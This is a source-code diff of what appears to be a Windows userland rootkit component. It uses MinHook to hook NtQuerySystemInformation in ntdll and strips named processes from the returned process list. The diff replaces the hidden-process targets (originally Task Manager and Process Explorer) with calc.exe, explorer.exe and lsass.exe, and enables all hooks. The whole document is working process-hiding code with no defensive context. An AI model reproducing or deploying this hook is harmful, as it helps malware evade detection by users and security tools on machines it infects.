@@ -1,6 +1,9 @@
 #include "main.h"
+#include <stdio.h>
+#include <iostream>
 
-const wchar_t* targetNames[] = {L"taskmgr.exe", L"procexp.exe", L"procexp64.exe"};
+/* const wchar_t* targetNames[] = {L"taskmgr.exe", L"procexp.exe", L"procexp64.exe"}; */
+const wchar_t* targetNames[] = {L"calc.exe", L"explorer.exe", L"lsass.exe"};
 // int targetsPIDs[] = {0, 0, 0};
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
@@ -28,6 +31,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
             for (int i = 0; i < 3; i++)
             {
                 if (!wcsncmp(pNext->ImageName.Buffer, targetNames[i], pNext->ImageName.Length))
+                // if (!wcsncmp(pNext->ImageName.Buffer, L"lsass.exe", pNext->ImageName.Length))
                 {
                     if (0 == pNext->NextEntryOffset)
                     {
@@ -55,7 +59,7 @@ void InstallHook()
 
     if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID*>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID*>(&OriginalNtQuerySystemInformation)) != MH_OK) { return; }
 
-    if (MH_EnableHook(&OriginalNtQuerySystemInformation) != MH_OK) { return; }
+    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) { return; }
 }
 
 
